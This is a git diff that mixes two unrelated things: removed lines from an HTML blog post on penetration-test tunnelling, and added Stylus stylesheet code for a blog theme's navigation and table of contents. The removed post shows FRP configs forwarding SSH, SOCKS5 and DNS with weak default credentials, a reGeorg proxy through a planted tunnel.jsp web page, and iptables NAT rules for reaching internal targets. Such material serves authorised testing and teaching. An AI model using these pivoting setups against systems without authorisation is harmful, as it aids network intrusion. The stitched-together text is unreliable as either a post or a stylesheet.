-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ vim frps.ini</span><br><span class="line">----------------------</span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0   </span><br><span class="line">bind_port = 7000</span><br><span class="line">dashboard_addr = 0.0.0.0   </span><br><span class="line">dashboard_port = 7500  </span><br><span class="line">token = 12345678   </span><br><span class="line">dashboard_user = admin  </span><br><span class="line">dashboard_pwd = admin </span><br><span class="line">vhost_http_port = 10080 </span><br><span class="line">vhost_https_port = 10443</span><br></pre></td></tr></table></figure>
-<p>Start server by doing this</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./frps -c frps.ini</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">nohup ./frps -c frps.ini &amp; <span class="comment"># run background</span></span><br></pre></td></tr></table></figure>
-<p>Access server 7500 port to see GUI dashboard.</p>
-<p>Client side config file</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ vim frpc.ini</span><br><span class="line">----------------------</span><br><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 7000</span><br><span class="line">token = 12345678 <span class="comment"># same as server side</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># service name</span></span><br><span class="line">[ssh]</span><br><span class="line"><span class="comment"># forwarding protocol type</span></span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 7001</span><br></pre></td></tr></table></figure>
-<p>Run client </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ./frpc -c frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># service socks</span></span><br><span class="line">[plugin_socks]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 46075</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = puser</span><br><span class="line">plugin_passwd = ppassword</span><br><span class="line">use_encryption = <span class="literal">true</span></span><br><span class="line">use_compression = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">[dns]</span><br><span class="line"><span class="built_in">type</span> = udp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 53</span><br><span class="line">remote_port = 42231</span><br></pre></td></tr></table></figure>
+  .post-copyright-info {
+    margin-top: $component-spacing-value;
+    width: 100%;
 
-<p>Then we access server 7001 port to connect client 22 port (ssh service), socks and dns are the same.  </p>
-<h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>It transfers data using web pages (js, php, jsp, asp …).<br>Download it by</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/sensepost/reGeorg.git</span><br></pre></td></tr></table></figure>
+    +keep-tablet() {
+      margin-top: $component-spacing-value * 0.8;
+    }
+  }
 
-<p>On your VPS to build a socks5 proxy</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python reGeorgSocksProxy.py -p 8080 -u http://xx.xx.xx.xx/tunnel.jsp</span><br></pre></td></tr></table></figure>
 
-<p>We use socks5 by connecting VPS_ip:8080</p>
-<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>Edit <code>/etc/sysctl.conf</code> to allow forwarding.</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure>
-<p>Then stop the service temporarily.</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service iptables stop</span><br></pre></td></tr></table></figure>
-<p>Configure rules. Connect VPS to access target.</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ iptables -t nat -A PREROUTING --dst VPS_ip -p tcp --dport VPS_port -j DNAT --to-destination target_ip:target_port</span><br><span class="line"></span><br><span class="line">$ iptables -t nat -A POSTROUTING --dst target_ip -p tcp --dport target_port -j SNAT --to-source VPS_ip</span><br></pre></td></tr></table></figure>
-<p>Save configuration and restart service.</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure>
+  .article-nav {
+    height: 40px;
+    margin-top: $component-spacing-value;
 
-<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>Productions:<br><a class="link"   target="_blank" rel="noopener" href="https://ngork.com/" >ngrok<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://www.ngork.cc/" >Sunny-Ngrok<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://natapp.cn/" >Natapp<i class="fas fa-external-link-alt"></i></a></p>
-<p>Projects:<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/SECFORCE/Tunna" >Tunna<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://sourceforge.net/projects/ssocks/" >sSocks<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://github.com/ehang-io/nps" >NPS<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://github.com/vzex/dog-tunnel" >Dog Tunnel<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://github.com/samhocevar/rinetd" >rinetd<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://github.com/rssnsj/portfwd" >portfwd<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://github.com/cw1997/NATBypass" >NATBypass<i class="fas fa-external-link-alt"></i></a></p>
-<p>Tools in <code>Linux</code> repo:<br><code>iptables</code> (before CentOS 7.0), <code>firewall</code> (after CentOS 7.0), <code>netcat</code> (<code>ncat</code>, <code>nc</code>), <code>socat</code></p>
+    .article-prev, .article-next {
+      max-width: $post-nav-max-width;
+      height: 100%;
+      box-sizing: border-box;
 
-        </div>
+      keep-container(true, 1.03, 1.03, 10px, 0);
 
-        
+      a {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 100%;
+        box-sizing: border-box;
 
-        
-            <ul class="post-tags-box">
-                
-                    <li class="tag-item">
-                        <a href="/tags/linux/">#linux</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/windows/">#windows</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/pentest/">#pentest</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
+        &.prev {
+          padding-left: $arrow-icon-width;
+        }
 
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2020/03/17/2020-03-17-MSF-Pentest-Route/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">MSF Pentest Route</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2020/03/12/2020-03-12-Domain-Pentest-Intro/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">Domain Pentest Intro</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+        &.next {
+          padding-right: $arrow-icon-width;
+        }
 
-        
-    </div>
-</div>
+        .arrow-icon {
+          position: absolute;
+          top: 0;
+          height: 100%;
+          width: $arrow-icon-width;
+
+          &.left {
+            left: 0;
+          }
+
+          &.right {
+            right: 0;
+          }
+        }
+
+        .title {
+          width: 100%;
+          height: 100%;
+        }
+      }
+
+    }
+
+    .article-prev {
+      float: left;
+    }
+
+    .article-next {
+      float: right;
+    }
+
+    .post-nav-item {
+      display: none;
+
+      +keep-tablet() {
+        display: inline-block;
+      }
+
+    }
+
+
+    .post-nav-title-item {
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+
+      +keep-tablet() {
+        display: none;
+      }
+    }
+
+  }
+
+
+}
+
 
 
                 
@@ -615,11 +475,80 @@ lcx_listen -- like lcx -listen
 
     
         <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH-Tunnel"><span class="nav-number">1.</span> <span class="nav-text">SSH Tunnel</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Basic-Config"><span class="nav-number">1.1.</span> <span class="nav-text">Basic Config</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Detailed-Parameters"><span class="nav-number">1.2.</span> <span class="nav-text">Detailed Parameters</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Local-Forwarding"><span class="nav-number">1.3.</span> <span class="nav-text">Local Forwarding</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Remote-Forwarding"><span class="nav-number">1.4.</span> <span class="nav-text">Remote Forwarding</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dynamic-Forwarding"><span class="nav-number">1.5.</span> <span class="nav-text">Dynamic Forwarding</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ICMP-Tunnel"><span class="nav-number">2.</span> <span class="nav-text">ICMP Tunnel</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ptunnel"><span class="nav-number">2.1.</span> <span class="nav-text">ptunnel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#icmpsh"><span class="nav-number">2.2.</span> <span class="nav-text">icmpsh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ping-Tunnel"><span class="nav-number">2.3.</span> <span class="nav-text">Ping Tunnel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS-Tunnel"><span class="nav-number">3.</span> <span class="nav-text">DNS Tunnel</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dnscat2"><span class="nav-number">3.1.</span> <span class="nav-text">dnscat2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iodine"><span class="nav-number">3.2.</span> <span class="nav-text">iodine</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LCX-Forwarding"><span class="nav-number">4.</span> <span class="nav-text">LCX Forwarding</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Parameter"><span class="nav-number">4.1.</span> <span class="nav-text">Parameter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Example"><span class="nav-number">4.2.</span> <span class="nav-text">Example</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EarthWorm"><span class="nav-number">5.</span> <span class="nav-text">EarthWorm</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Parameters"><span class="nav-number">5.1.</span> <span class="nav-text">Parameters</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Forward-proxy"><span class="nav-number">5.2.</span> <span class="nav-text">Forward proxy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse-proxy"><span class="nav-number">5.3.</span> <span class="nav-text">Reverse proxy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LCX-type"><span class="nav-number">5.4.</span> <span class="nav-text">LCX type</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FRP"><span class="nav-number">6.</span> <span class="nav-text">FRP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reGeorg"><span class="nav-number">7.</span> <span class="nav-text">reGeorg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iptables"><span class="nav-number">8.</span> <span class="nav-text">iptables</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Others"><span class="nav-number">9.</span> <span class="nav-text">Others</span></a></li></ol>
-    </div>
-</div>
+            .post-toc-wrap {
+  width: 100%;
+  font-size: 0.92rem;
+  box-sizing: border-box;
+
+  .post-toc {
+
+    ol {
+      list-style: none;
+      margin: 0;
+      padding: 0 2px 12px 10px;
+      text-align: left;
+
+      &:last-child {
+        padding-bottom: 0;
+      }
+
+      > ol {
+        padding-left: 0;
+      }
+
+      a {
+        transition-property: all;
+        transition();
+      }
+    }
+
+
+    .nav-item {
+      line-height: 1.8;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+
+    .nav {
+      .nav-child {
+        display: hexo-config('toc.expand_all') ? block : none;
+      }
+
+      .active > .nav-child {
+        display: block;
+      }
+
+      .active-current > .nav-child {
+        display: block;
+
+        > .nav-item {
+          display: block;
+        }
+      }
+
+
+      .nav-number, .nav-text {
+        color: var(--default-text-color);
+      }
+
+      .active > a {
+        .nav-number, .nav-text {
+          color: var(--primary-color);
+        }
+      }
+
+      .active-current > a {
+        .nav-number, .nav-text {
+          color: var(--primary-color);
+        }
+      }
+    }
+  }
+}
+
+
         </aside>
     
 
